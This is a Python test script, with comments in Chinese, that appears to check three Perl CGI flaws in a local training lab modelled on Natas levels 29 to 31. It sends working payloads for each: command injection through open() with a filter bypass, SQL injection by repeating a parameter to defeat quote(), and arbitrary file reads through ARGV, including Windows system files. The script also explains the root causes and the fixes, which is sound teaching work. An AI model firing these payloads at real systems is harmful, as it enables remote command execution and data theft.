#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
=============================================================================
 verify_perllab.py — 三個 Perl 特有漏洞驗證
=============================================================================

 驗證三項：
   P29  Perl open() 命令注入（natas29）
   P30  DBI quote() 型別混淆（natas30）
   P31  CGI param() + ARGV（natas31）

 ★ 全部用真實 Perl 5.42.3 CGI 執行。

 用法：
   python verify_perllab.py 8990
=============================================================================
"""

import json
import re
import sys
import urllib.error
import urllib.parse
import urllib.request
import uuid

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8990
BASE = "http://127.0.0.1:%d" % PORT
results = []


def get(path):
    req = urllib.request.Request(BASE + path,
                                 headers={"User-Agent": "perl-edu/1.0"})
    try:
        with urllib.request.urlopen(req, timeout=25) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:                                   # noqa: BLE001
        return -1, str(e)


def post(path, body, ctype="application/x-www-form-urlencoded"):
    req = urllib.request.Request(
        BASE + path, data=body if isinstance(body, bytes) else body.encode(),
        headers={"User-Agent": "perl-edu/1.0", "Content-Type": ctype})
    try:
        with urllib.request.urlopen(req, timeout=25) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:                                   # noqa: BLE001
        return -1, str(e)


def txt(b):
    return re.sub(r"\s+", " ", re.sub(r"<[^>]+>", " ", b)).strip()


def check(name, cwe, passed, evidence):
    results.append((name, cwe, passed, evidence))
    mark = "PASS（漏洞存在）" if passed else "FAIL（未觸發）"
    print("\n" + "-" * 76)
    print("[%s] %s  —  %s" % (mark, name, cwe))
    print("-" * 76)
    for line in evidence.splitlines():
        print("   " + line)


def multipart(fields, files):
    boundary = "----B" + uuid.uuid4().hex[:16]
    parts = []
    for name, value in fields:
        parts += [("--" + boundary).encode(),
                  ('Content-Disposition: form-data; name="%s"' % name).encode(),
                  b"", value.encode()]
    for name, filename, content in files:
        parts += [("--" + boundary).encode(),
                  ('Content-Disposition: form-data; name="%s"; filename="%s"'
                   % (name, filename)).encode(),
                  b"Content-Type: text/csv", b"", content.encode()]
    parts += [("--" + boundary + "--").encode(), b""]
    return b"\r\n".join(parts), "multipart/form-data; boundary=" + boundary


def main():
    print("=" * 76)
    print(" PerlLab 驗證 — 三個 Perl 特有漏洞（真實 Perl CGI）")
    print(" 目標：%s" % BASE)
    print("=" * 76)

    st, body = get("/")
    if st != 200:
        print("\n[錯誤] 無法連線（HTTP %s）" % st)
        sys.exit(1)

    # ============ P29：open() 命令注入 ============
    # ① 正常檔案（失敗，因為沒有 .txt）
    st_a, b_a = get("/p29?file=perl+underground")
    # ② 命令執行
    st_b, b_b = get("/p29?file=%7Cecho+hello%00")
    cmd_ok = "hello" in txt(b_b).lower() and "open(" in b_b
    # ③ 過濾擋住
    st_c, b_c = get("/p29?file=%7Ctype+secrets%2Fsecret.txt%00")
    filtered = "被過濾" in b_c
    # ④ 繞過過濾（^ 轉義）
    st_d, b_d = get("/p29?file=%7Ctype+secre%5Ets%5Csecr%5Eet.txt%00")
    bypass_ok = "FLAG{perl_open_command_injection_2026}" in b_d

    ev = [
        "① 正常    : /p29?file=perl+underground → open 失敗（.txt 不存在）",
        "② 命令執行: /p29?file=|echo+hello%%00",
        "            輸出含 'hello' = %s" % cmd_ok,
        "③ 被過濾  : /p29?file=|type+secrets/secret.txt%%00",
        "            顯示「被過濾」= %s" % filtered,
        "④ ★ 繞過  : /p29?file=|type+secre^ts\\secr^et.txt%%00",
        "            讀到 FLAG = %s" % bypass_ok,
        "預期漏洞  : Perl 2 參數 open() 可用 '|' 執行命令",
        "根因      : (a) open() 2 參數形式接受 '|' 前綴",
        "            (b) 程式加上 .txt 後綴 → 用 %00 截斷",
        "            (c) 'secret' 過濾 → 用 '^' 轉義（cmd）或 ''（shell）繞過",
        "危害      : 遠端命令執行（RCE）",
        "驗證方式  : **執行無害命令並確認輸出**（echo hello）",
        "修補方向  : 用 3 參數 open（open(FH, '<', $file)）；白名單；",
        "            不把使用者輸入拼進 open()",
        "OWASP 對照: CWE-78（OS 命令注入）",
    ]
    check("P29 Perl open() 命令注入", "CWE-78",
          cmd_ok and filtered and bypass_ok, "\n".join(ev))

    # ============ P30：quote() 型別混淆 ============
    # 正常（失敗）
    st_n, b_n = post("/p30", "username=admin&password=x")
    normal_fail = "fail" in b_n.lower()
    # 注入：同一參數名兩次
    inj = "'xxx' or 1=1 "
    body_inj = "username=admin&password=" + urllib.parse.quote(inj) + "&password=2"
    st_i, b_i = post("/p30", body_inj)
    inject_ok = "FLAG{dbi_quote_type_confusion_2026}" in b_i
    sql_match = re.search(r"query = ([^<]+)", b_i)
    sql_text = sql_match.group(1).strip() if sql_match else ""

    ev = [
        "正常請求  : username=admin&password=x → %s" % ("fail" if normal_fail else "?"),
        "注入請求  : username=admin&password='xxx' or 1=1 &password=2",
        "            查詢 = %s" % sql_text[:150],
        "★ 結果    : 讀到 FLAG = %s" % inject_ok,
        "預期漏洞  : 同一參數名兩次 → quote($value, $data_type)",
        "根因      : (a) param('password') 在列表上下文返回多值",
        "            (b) DBI quote($value, $type) 的 type=NUMERIC 不加引號",
        "            ★ 註：DBD::mysql 支援型別參數；DBD::SQLite 忽略，",
        "              本靶場用 quote_mysql() 明確模擬（param() 多值是真實行為）",
        "危害      : 繞過 quote() 防護 → SQL 注入",
        "驗證方式  : **確認同一參數名兩次時，查詢中的引號被移除**",
        "修補方向  : 用參數化查詢（placeholder）；不要依賴 quote()",
        "OWASP 對照: CWE-89（SQL 注入）+ CWE-843（型別混淆）",
    ]
    check("P30 DBI quote() 型別混淆", "CWE-89 / CWE-843",
          normal_fail and inject_ok, "\n".join(ev))

    # ============ P31：CGI param() + ARGV ============
    # ① 只有真檔案（正常，但不讀任意檔案）
    body1, ct1 = multipart([], [("file", "d.csv", "a,b")])
    st1, b1 = post("/p31", body1, ct1)
    # ② ARGV + URL 參數（讀任意檔案）
    body2, ct2 = multipart([("file", "ARGV")], [("file", "d.csv", "a,b")])
    st2, b2 = post("/p31?" + urllib.parse.quote("secrets/secret.txt", safe=""),
                   body2, ct2)
    read_ok = "FLAG{perl_open_command_injection_2026}" in b2
    # ③ 讀 Windows 系統檔（證明任意檔案）
    body3, ct3 = multipart([("file", "ARGV")], [("file", "d.csv", "a,b")])
    st3, b3 = post("/p31?" + urllib.parse.quote("C:/Windows/win.ini", safe=""),
                   body3, ct3)
    win_ok = "16-bit app support" in b3 or "[fonts]" in b3

    ev = [
        "① 只有真檔案: 顯示上傳的 CSV（不會讀任意檔案）",
        "② ★ ARGV    : POST /p31?secrets/secret.txt",
        "              （multipart: file=ARGV + 一個真檔案）",
        "              讀到 FLAG = %s" % read_ok,
        "③ 任意檔案  : POST /p31?C:/Windows/win.ini",
        "              讀到系統檔 = %s" % win_ok,
        "預期漏洞  : 標量上下文的第一個值 + <> 對 ARGV 遍歷 @ARGV",
        "根因      : (a) upload('file') 只要求其中一個是檔案",
        "            (b) param('file') 標量取第一個值（ARGV）",
        "            (c) <> 對字串 'ARGV' 遍歷 @ARGV（URL ? 後的參數）",
        "危害      : 讀取任意檔案（本靶場讀到 secrets/secret.txt 與 win.ini）",
        "驗證方式  : **讀取兩個不同檔案並確認內容**",
        "修補方向  : 驗證 param('file') 必須是 filehandle（ref 檢查）；",
        "            不信任 upload() 對多值的假設",
        "OWASP 對照: CWE-434 / CWE-73（外部控制檔案名）",
    ]
    check("P31 CGI param() + ARGV", "CWE-73",
          read_ok and win_ok, "\n".join(ev))

    # ================= 總結 =================
    print("\n" + "=" * 76)
    print(" 總結")
    print("=" * 76)
    found = sum(1 for _, _, p, _ in results if p)
    for name, cwe, passed, _ in results:
        print("  %-32s %-20s %s" % (name, cwe, "成立" if passed else "未觸發"))
    print("-" * 76)
    print("  通過 %d/%d" % (found, len(results)))
    print()
    print("  三個 Perl 漏洞的共同點：")
    print("    Perl 的「列表上下文」與「標量上下文」差異，")
    print("    讓同一個函式在不同呼叫情境下行為完全不同。")
    print("=" * 76)

    with open("perllab_result.json", "w", encoding="utf-8") as f:
        json.dump([{"name": n, "cwe": c, "present": p} for n, c, p, _ in results],
                  f, ensure_ascii=False, indent=2)
    print("\n（JSON 摘要已寫入 perllab_result.json）")


if __name__ == "__main__":
    main()
